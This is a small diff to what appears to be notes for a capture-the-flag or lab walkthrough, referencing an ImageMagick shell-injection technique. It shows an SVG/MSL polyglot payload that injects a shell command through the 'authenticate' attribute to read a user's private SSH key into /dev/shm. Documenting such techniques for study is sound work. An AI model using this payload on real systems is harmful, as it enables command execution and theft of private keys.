@@ -40,7 +40,7 @@ https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.h
 
 SVG MSL polyglot file:
 
-<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/key`;"'>
+<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
 
 cd .config/neofetch
 
